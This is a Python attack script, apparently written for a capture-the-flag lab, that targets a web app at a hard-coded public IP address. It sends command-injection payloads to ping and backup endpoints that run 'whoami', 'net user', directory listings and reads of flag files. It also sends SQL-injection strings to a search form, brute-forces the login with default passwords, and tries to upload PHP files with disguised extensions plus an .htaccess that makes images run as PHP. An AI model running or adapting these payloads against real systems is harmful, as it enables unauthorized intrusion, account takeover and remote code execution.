import requests
import re

requests.packages.urllib3.disable_warnings()

TARGET = "http://119.29.238.216:8088"
TIMEOUT = 15

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded",
}

session = requests.Session()
session.verify = False
session.headers.update(HEADERS)

FLAGS_FOUND = []


def add_flag(location, content, method=""):
    FLAGS_FOUND.append({"location": location, "content": content, "method": method})
    print(f"\n  🚩 发现FLAG! [{method}]")
    print(f"     位置: {location}")
    print(f"     内容: {content}")


def check_flag_pattern(text):
    patterns = [
        r'flag\{[^}]+\}',
        r'FLAG\{[^}]+\}',
        r'ctf\{[^}]+\}',
        r'CTF\{[^}]+\}',
        r'f[l1]ag\{[^}]+\}',
    ]
    for pattern in patterns:
        matches = re.findall(pattern, text, re.IGNORECASE)
        for match in matches:
            return match
    return None


def print_section(title):
    print("\n" + "=" * 70)
    print(f"  {title}")
    print("=" * 70)


def get_csrf(url):
    """获取CSRF token"""
    try:
        r = session.get(url, timeout=TIMEOUT)
        csrf = re.search(r'name=["\']csrf["\']\s*value=["\']([^"\']+)["\']', r.text)
        return csrf.group(1) if csrf else ""
    except:
        return ""


def test_ping_post():
    """POST方法测试Ping"""
    print_section("1. Ping POST测试")
    
    url = f"{TARGET}/ping"
    
    ping_payloads = [
        {"host": "127.0.0.1"},
        {"host": "127.0.0.1; dir"},
        {"host": "127.0.0.1; type F:\\small peoject\\python-lab\\flag.txt"},
        {"host": "127.0.0.1&&dir"},
        {"host": "127.0.0.1|dir"},
        {"host": ";dir"},
        {"host": "&&dir"},
        {"host": "|dir"},
        {"host": "127.0.0.1; findstr /m flag F:\\*.txt"},
        {"host": "127.0.0.1; whoami"},
        {"host": "127.0.0.1; ipconfig"},
        {"host": "127.0.0.1; net user"},
        {"host": "127.0.0.1; type F:\\flag.txt"},
        {"host": "127.0.0.1; type F:\\flag"},
        {"host": "127.0.0.1; type C:\\flag.txt"},
        {"host": "127.0.0.1; type C:\\flag"},
        {"host": "127.0.0.1; type ../flag.txt"},
        {"host": "127.0.0.1; type ../../flag.txt"},
    ]
    
    for payload in ping_payloads:
        try:
            r = session.post(url, data=payload, timeout=TIMEOUT)
            
            if r.status_code == 200:
                content = r.text
                
                # 提取body内容
                body_match = re.search(r'<main[^>]*>(.*?)</main>', content, re.DOTALL)
                if body_match:
                    body_content = body_match.group(1)
                else:
                    body_content = content
                
                # 检查命令执行迹象
                indicators = ["flag", "DIRECTORY", "Volume in drive", "txt", "Users", "Program Files"]
                has_indicator = any(i in body_content for i in indicators)
                
                if has_indicator or len(body_content) > 500:
                    print(f"\n  [{r.status_code}] POST host={payload['host']}")
                    print(f"     响应: {body_content[:800]}")
                    
                    flag = check_flag_pattern(body_content)
                    if flag:
                        add_flag(f"Ping POST: {payload['host']}", flag, "命令执行结果")
                        
        except Exception as e:
            print(f"  错误: {e}")


def test_backup_post():
    """POST方法测试Backup"""
    print_section("2. Backup POST测试")
    
    url = f"{TARGET}/backup"
    
    backup_payloads = [
        {"path": "F:\\small peoject\\python-lab\\uploads"},
        {"path": "F:\\small peoject\\python-lab"},
        {"path": "F:\\small peoject\\python-lab\\flag.txt"},
        {"path": "F:\\small peoject\\python-lab\\flag"},
        {"path": "F:\\flag.txt"},
        {"path": "F:\\flag"},
        {"path": "F:\\small peoject\\python-lab\\uploads; dir"},
        {"path": "F:\\small peoject\\python-lab\\uploads&&dir"},
        {"path": "F:\\small peoject\\python-lab\\uploads|dir"},
        {"path": ";dir"},
        {"path": "&&dir"},
        {"path": "|dir"},
        {"path": "; type F:\\flag.txt"},
        {"path": "&& type F:\\flag.txt"},
        {"path": "| type F:\\flag.txt"},
        {"path": "`dir`"},
        {"path": "$(dir)"},
        {"path": "F:\\small peoject\\python-lab\\uploads; type F:\\small peoject\\python-lab\\flag.txt"},
        {"path": "F:\\small peoject\\python-lab\\uploads; findstr /m flag F:\\*.txt"},
        {"path": "F:\\small peoject\\python-lab\\uploads; whoami"},
    ]
    
    for payload in backup_payloads:
        try:
            r = session.post(url, data=payload, timeout=TIMEOUT)
            
            if r.status_code == 200:
                content = r.text
                
                body_match = re.search(r'<main[^>]*>(.*?)</main>', content, re.DOTALL)
                body_content = body_match.group(1) if body_match else content
                
                indicators = ["flag", "DIRECTORY", "Volume in drive", "txt", "Users", "Program Files"]
                has_indicator = any(i in body_content for i in indicators)
                
                if has_indicator or len(body_content) > 500:
                    print(f"\n  [{r.status_code}] POST path={payload['path']}")
                    print(f"     响应: {body_content[:800]}")
                    
                    flag = check_flag_pattern(body_content)
                    if flag:
                        add_flag(f"Backup POST: {payload['path']}", flag, "命令执行结果")
                        
        except Exception as e:
            print(f"  错误: {e}")


def test_sql_post():
    """POST方法测试SQL注入"""
    print_section("3. SQL POST测试")
    
    url = f"{TARGET}/search"
    
    sql_payloads = [
        {"q": "SQL"},
        {"q": "1' OR 1=1--"},
        {"q": "1' OR '1'='1"},
        {"q": "1' UNION SELECT 1,2,3"},
        {"q": "1' UNION SELECT 1,version(),3"},
        {"q": "1' UNION SELECT 1,database(),3"},
        {"q": "' OR 1=1"},
        {"q": "\" OR 1=1"},
        {"q": "' OR 'a'='a"},
        {"q": "admin' --"},
        {"q": "admin'#"},
        {"q": "flag"},
        {"q": "admin"},
        {"q": "root"},
        {"q": "secret"},
        {"q": "password"},
        {"q": "1' ORDER BY 1"},
        {"q": "1' ORDER BY 2"},
        {"q": "1' ORDER BY 3"},
        {"q": "0' UNION SELECT 1,2,3"},
        {"q": "-1' OR 1=1"},
    ]
    
    for payload in sql_payloads:
        try:
            r = session.post(url, data=payload, timeout=TIMEOUT)
            
            if r.status_code == 200:
                content = r.text
                
                body_match = re.search(r'<main[^>]*>(.*?)</main>', content, re.DOTALL)
                body_content = body_match.group(1) if body_match else content
                
                sql_errors = ["SQL syntax", "mysql", "MySQL", "database", "error", "root", "admin", "flag"]
                has_error = any(e in body_content for e in sql_errors)
                
                if has_error or len(body_content) > 500:
                    print(f"\n  [{r.status_code}] POST q={payload['q']}")
                    print(f"     响应: {body_content[:500]}")
                    
                    flag = check_flag_pattern(body_content)
                    if flag:
                        add_flag(f"SQL POST: {payload['q']}", flag, "SQL查询结果")
                        
        except Exception as e:
            print(f"  错误: {e}")


def test_login_post():
    """POST方法测试登录"""
    print_section("4. 登录POST测试")
    
    url = f"{TARGET}/login"
    
    credentials = [
        ("admin", "admin"),
        ("admin", "admin123"),
        ("admin", "123456"),
        ("admin", "password"),
        ("root", "root"),
        ("root", "password"),
        ("test", "test"),
        ("user", "user"),
        ("admin", "888888"),
        ("admin", "000000"),
        ("admin", "abc123"),
        ("admin", "welcome"),
        ("admin", "changeme"),
        ("admin", "term3lab"),
        ("admin", "ctf"),
        ("admin", "flag"),
        ("admin", "password123"),
        ("admin", "password1"),
        ("admin", "admin888"),
    ]
    
    csrf_token = get_csrf(url)
    print(f"  CSRF Token: {csrf_token}")
    
    for username, password in credentials:
        try:
            data = {
                "username": username,
                "password": password,
            }
            if csrf_token:
                data["csrf"] = csrf_token
            
            r = session.post(url, data=data, timeout=TIMEOUT)
            
            if r.status_code == 302:
                print(f"\n  🎉 登录成功: {username}/{password}")
                print(f"     跳转: {r.headers.get('Location', '')}")
                
                # 获取跳转后的页面
                if r.headers.get('Location'):
                    redirect_url = f"{TARGET}{r.headers['Location']}"
                    r2 = session.get(redirect_url, timeout=TIMEOUT)
                    content = r2.text
                    print(f"     页面内容: {content[:500]}")
                    
                    flag = check_flag_pattern(content)
                    if flag:
                        add_flag(f"登录成功: {username}/{password}", flag, "登录后页面")
                        
            elif r.status_code == 200:
                content = r.text
                
                body_match = re.search(r'<main[^>]*>(.*?)</main>', content, re.DOTALL)
                body_content = body_match.group(1) if body_match else content
                
                if "dashboard" in body_content.lower() or "welcome" in body_content.lower():
                    print(f"\n  🎉 登录成功: {username}/{password}")
                    print(f"     内容: {body_content[:500]}")
                    
                    flag = check_flag_pattern(body_content)
                    if flag:
                        add_flag(f"登录成功: {username}/{password}", flag, "登录后页面")
                        
        except Exception as e:
            print(f"  错误: {e}")


def test_upload_post():
    """POST方法测试文件上传"""
    print_section("5. 文件上传POST测试")
    
    url = f"{TARGET}/upload"
    csrf_token = get_csrf(url)
    print(f"  CSRF Token: {csrf_token}")
    
    test_files = [
        ("test.txt", "text/plain", b"Hello World"),
        ("test.png", "image/png", b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x10\x00\x00\x00\x10\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\x04sBIT\x08\x08\x08\x08|\x88|\x88l\x88l\x88\x00\x00\x00\x1dIDATx\x9c\xed\xc1\x01\r\x00\x00\x00\xc2\xa0\xf7\xfd\xff?\xff\x00\x00\x00\x05\xff\x00\xff\x00\xff\x00\xff\x00\x00\x00\x00IEND\xaeB`\x82"),
        ("test.php", "application/php", b"<?php echo 'test'; ?>"),
        ("test.php.png", "image/png", b"<?php echo 'test'; ?>"),
        ("test.phtml", "application/x-httpd-php", b"<?php echo 'test'; ?>"),
        ("test.phps", "application/x-httpd-php-source", b"<?php echo 'test'; ?>"),
        ("test.htaccess", "text/plain", b"AddType application/x-httpd-php .png"),
        ("flag.txt", "text/plain", b"test flag"),
    ]
    
    for filename, content_type, content in test_files:
        try:
            files = {"file": (filename, content, content_type)}
            data = {"csrf": csrf_token} if csrf_token else {}
            
            r = session.post(url, files=files, data=data, timeout=TIMEOUT)
            
            if r.status_code == 200:
                content = r.text
                
                body_match = re.search(r'<main[^>]*>(.*?)</main>', content, re.DOTALL)
                body_content = body_match.group(1) if body_match else content
                
                if "success" in body_content.lower() or "上传成功" in body_content:
                    print(f"\n  🎉 上传成功: {filename}")
                    print(f"     内容: {body_content[:500]}")
                    
                    flag = check_flag_pattern(body_content)
                    if flag:
                        add_flag(f"上传成功: {filename}", flag, "上传响应")
                else:
                    print(f"\n  [{r.status_code}] 上传: {filename}")
                    print(f"     响应: {body_content[:200]}")
                    
        except Exception as e:
            print(f"  错误: {e}")


def main():
    print("*" * 70)
    print("  CTF漏洞POST测试")
    print("  目标: " + TARGET)
    print("*" * 70)
    
    test_ping_post()
    test_backup_post()
    test_sql_post()
    test_login_post()
    test_upload_post()
    
    print_section("检测结果汇总")
    
    if FLAGS_FOUND:
        print(f"\n  🎉 共发现 {len(FLAGS_FOUND)} 个FLAG!")
        for i, flag_info in enumerate(FLAGS_FOUND):
            print(f"\n  [{i+1}] {flag_info['method']}")
            print(f"      位置: {flag_info['location']}")
            print(f"      FLAG: {flag_info['content']}")
    else:
        print("\n  ❌ 未发现FLAG")
        print("\n  建议:")
        print("     1. 使用浏览器打开页面手动测试")
        print("     2. 检查页面完整内容")
        print("     3. 查看浏览器开发者工具的网络请求")
    
    print()


if __name__ == "__main__":
    main()